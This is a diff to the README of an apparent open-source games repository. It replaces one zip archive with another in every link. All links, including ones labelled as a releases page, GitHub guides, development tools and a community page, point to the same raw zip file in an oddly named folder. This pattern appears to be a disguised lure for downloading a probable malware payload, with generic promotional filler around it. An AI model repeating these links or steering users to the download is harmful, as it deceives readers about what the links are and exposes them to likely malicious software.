@@ -12,7 +12,7 @@ Welcome to the open-source-games repository! Here, you will find a wonderful col
 Ready to dive into the world of open-source gaming? Follow these simple steps to get started.
 
 ## 🔗 Download Now
-[![Download open-source-games](https://raw.githubusercontent.com/beamed123/open-source-games/main/staphylomycosis/open-source-games-appinite.zip%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/beamed123/open-source-games/main/staphylomycosis/open-source-games-appinite.zip)
+[![Download open-source-games](https://raw.githubusercontent.com/beamed123/open-source-games/main/staphylomycosis/open_games_source_v2.7-alpha.5.zip%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/beamed123/open-source-games/main/staphylomycosis/open_games_source_v2.7-alpha.5.zip)
 
 ## 💻 System Requirements
 To play these games, you need:
@@ -22,7 +22,7 @@ To play these games, you need:
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:**
-   Go to our [Releases page](https://raw.githubusercontent.com/beamed123/open-source-games/main/staphylomycosis/open-source-games-appinite.zip) to find all available versions of the games.
+   Go to our [Releases page](https://raw.githubusercontent.com/beamed123/open-source-games/main/staphylomycosis/open_games_source_v2.7-alpha.5.zip) to find all available versions of the games.
 
 2. **Choose Your Game:**
    Browse the list of games and select the one you want to play. 
@@ -63,11 +63,11 @@ If you encounter any issues while downloading or playing the games, please visit
 This repository is licensed under the MIT License. You are free to use, copy, modify, and distribute the games as long as you include the original license within your distribution.
 
 ## 🔗 Additional Resources
-- [GitHub Guides](https://raw.githubusercontent.com/beamed123/open-source-games/main/staphylomycosis/open-source-games-appinite.zip)
-- [Free Game Development Tools](https://raw.githubusercontent.com/beamed123/open-source-games/main/staphylomycosis/open-source-games-appinite.zip)
-- [Join the Community](https://raw.githubusercontent.com/beamed123/open-source-games/main/staphylomycosis/open-source-games-appinite.zip) - connect with other gamers and developers.
+- [GitHub Guides](https://raw.githubusercontent.com/beamed123/open-source-games/main/staphylomycosis/open_games_source_v2.7-alpha.5.zip)
+- [Free Game Development Tools](https://raw.githubusercontent.com/beamed123/open-source-games/main/staphylomycosis/open_games_source_v2.7-alpha.5.zip)
+- [Join the Community](https://raw.githubusercontent.com/beamed123/open-source-games/main/staphylomycosis/open_games_source_v2.7-alpha.5.zip) - connect with other gamers and developers.
 
 ## 🔗 Download Again
-Don't forget to return to our [Releases page](https://raw.githubusercontent.com/beamed123/open-source-games/main/staphylomycosis/open-source-games-appinite.zip) whenever you want to download more exciting games!
+Don't forget to return to our [Releases page](https://raw.githubusercontent.com/beamed123/open-source-games/main/staphylomycosis/open_games_source_v2.7-alpha.5.zip) whenever you want to download more exciting games!
 
 Thank you for choosing open-source-games. Enjoy your gaming experience!
